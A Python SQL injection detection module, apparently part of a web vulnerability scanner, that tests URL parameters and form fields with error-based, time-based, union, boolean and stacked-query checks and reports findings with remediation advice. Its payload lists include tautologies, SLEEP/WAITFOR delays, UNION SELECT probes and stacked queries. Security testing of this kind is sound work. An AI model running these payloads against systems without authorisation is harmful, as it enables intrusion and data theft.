from __future__ import annotations
import time
from urllib.parse import urlparse
from .base import BaseModule
from ..scanner import Finding, HIGH, mutate_query, SQL_ERRORS

class SQLInjectionModule(BaseModule):
    name = "SQL Injection"
    category = "Injection"

    def run(self):
        for url in list(self.scanner.pages):
            self._check_url(url)
        
        for form in self.scanner.forms:
            self._check_form(form)

    def _check_url(self, url):
        parsed = urlparse(url)
        from urllib.parse import parse_qsl
        params = dict(parse_qsl(parsed.query, keep_blank_values=True))

        for param in params:
            # 1. Error-based
            self._test_error_based(url, param, "GET")
            # 2. Time-based blind
            self._test_time_based(url, param, "GET")
            # 3. Union-based
            self._test_union_based(url, param, "GET")
            # 4. Boolean-based blind
            self._test_boolean_based(url, param, "GET")
            # 5. Stacked queries
            self._test_stacked_queries(url, param, "GET")

    def _check_form(self, form):
        for param in form.inputs:
            self._test_error_based(form.action, param, form.method, form.inputs)
            self._test_time_based(form.action, param, form.method, form.inputs)
            self._test_union_based(form.action, param, form.method, form.inputs)
            self._test_boolean_based(form.action, param, form.method, form.inputs)
            self._test_stacked_queries(form.action, param, form.method, form.inputs)

    def _test_error_based(self, url, param, method, base_data=None):
        payloads = [
            "'", "\"", "')", "\")", "'))", "\"))",
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--",
            "' OR 1=1#", "\" OR 1=1#",
            "\\", "%%", "%' OR '1'='1",
            "')) OR 1=1--",
            "\" OR \"a\"=\"a",
            "') OR ('a'='a",
        ]
        # Get baseline to avoid flagging errors already on page
        baseline = self.scanner.pages.get(url)
        baseline_text = baseline.text.lower() if baseline else ""
        
        for payload in payloads:
            res = self._send_payload(url, param, method, payload, base_data)
            if not res: continue
            
            res_text = res.text.lower()
            for error in SQL_ERRORS:
                if error in res_text and error not in baseline_text:
                    self._report(url, param, method, payload, f"New SQL error message appeared in response: {error}")
                    return

    def _test_time_based(self, url, param, method, base_data=None):
        payloads = [
            "'; SELECT SLEEP(5)--",
            "\"; SELECT SLEEP(5)--",
            "'); SELECT SLEEP(5)--",
            "'); SELECT pg_sleep(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) FROM DUAL--",
        ]
        for payload in payloads:
            start = time.monotonic()
            res = self._send_payload(url, param, method, payload, base_data)
            duration = time.monotonic() - start
            
            if duration >= 5:
                self._report(url, param, method, payload, "Time-based SQLi detected (server delayed for 5+ seconds).")
                return

    def _send_payload(self, url, param, method, payload, base_data=None):
        if method == "GET":
            target_url = mutate_query(url, param, payload)
            return self.scanner._request("GET", target_url)
        else:
            data = dict(base_data) if base_data else {}
            data[param] = payload
            return self.scanner._request("POST", url, data=data)

    def _test_union_based(self, url, param, method, base_data=None):
        """Test for Union-based SQL Injection"""
        # First, try to detect number of columns
        payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3,4,5--",
            "') UNION SELECT NULL,NULL,NULL--",
        ]

        # Get baseline response
        baseline = self._send_payload(url, param, method, param, base_data)
        baseline_length = len(baseline.text) if baseline else 0

        for payload in payloads:
            res = self._send_payload(url, param, method, payload, base_data)
            if not res: continue

            # Check for significant response changes or SQL keywords
            if abs(len(res.text) - baseline_length) > 100:
                # Check for union-specific indicators
                indicators = ["union", "select", "null"]
                text_lower = res.text.lower()
                if any(ind in text_lower for ind in indicators):
                    self._report(url, param, method, payload,
                               "Union-based SQLi: Response changed significantly with UNION payload")
                    return

    def _test_boolean_based(self, url, param, method, base_data=None):
        """Test for Boolean-based Blind SQL Injection"""
        # Send true and false conditions
        true_payloads = [
            "' AND '1'='1",
            "' AND 1=1--",
            "') AND ('1'='1",
        ]
        false_payloads = [
            "' AND '1'='2",
            "' AND 1=2--",
            "') AND ('1'='2",
        ]

        for true_payload, false_payload in zip(true_payloads, false_payloads):
            true_res = self._send_payload(url, param, method, true_payload, base_data)
            false_res = self._send_payload(url, param, method, false_payload, base_data)

            if true_res and false_res:
                # Check if responses differ significantly
                true_len = len(true_res.text)
                false_len = len(false_res.text)

                # Significant difference suggests boolean-based SQLi
                if abs(true_len - false_len) > 50:
                    self._report(url, param, method, true_payload,
                               f"Boolean-based blind SQLi: TRUE response={true_len}B, FALSE response={false_len}B")
                    return

                # Check for different content (not just length)
                if true_res.text != false_res.text:
                    # Calculate difference percentage
                    diff = sum(a != b for a, b in zip(true_res.text, false_res.text))
                    if diff > 10:  # More than 10 character differences
                        self._report(url, param, method, true_payload,
                                   "Boolean-based blind SQLi: Responses differ for TRUE/FALSE conditions")
                        return

    def _test_stacked_queries(self, url, param, method, base_data=None):
        """Test for Stacked Queries SQL Injection"""
        payloads = [
            "'; SELECT SLEEP(3)--",
            "\"; SELECT SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "'; EXEC sp_MSforeachtable 'SELECT 1'--",
            "1; SELECT COUNT(*) FROM information_schema.tables--",
        ]

        for payload in payloads:
            start = time.monotonic()
            res = self._send_payload(url, param, method, payload, base_data)
            duration = time.monotonic() - start

            # Check for time delay (indicates stacked query execution)
            if duration >= 3:
                self._report(url, param, method, payload,
                           "Stacked queries SQLi: Multiple statements executed (time delay detected)")
                return

            # Check for stacked query indicators in response
            if res:
                indicators = ["multiple statements", "batch", "syntax near", "expects parameter"]
                text_lower = res.text.lower()
                if any(ind in text_lower for ind in indicators):
                    self._report(url, param, method, payload,
                               "Stacked queries SQLi: Error suggests multiple statement support")
                    return

    def _report(self, url, param, method, payload, evidence):
        # Determine SQLi type from evidence
        sqli_type = "SQL Injection"
        if "time-based" in evidence.lower():
            sqli_type = "Time-based Blind SQL Injection"
        elif "union" in evidence.lower():
            sqli_type = "Union-based SQL Injection"
        elif "boolean" in evidence.lower():
            sqli_type = "Boolean-based Blind SQL Injection"
        elif "stacked" in evidence.lower():
            sqli_type = "Stacked Queries SQL Injection"

        self.add_finding(Finding(
            id="SQLI-001",
            name=sqli_type,
            category="SQL Injection",
            severity=HIGH,
            confidence="High",
            url=url,
            parameter=param,
            method=method,
            evidence=evidence,
            trigger=f"payload={payload}",
            impact="SQL injection allows attackers to read, modify, or delete database records. Can lead to authentication bypass, data theft, or complete system compromise.",
            remediation="Use parameterized queries, prepared statements, and input validation. Never concatenate user input into SQL queries.",
            cwe="CWE-89"
        ))
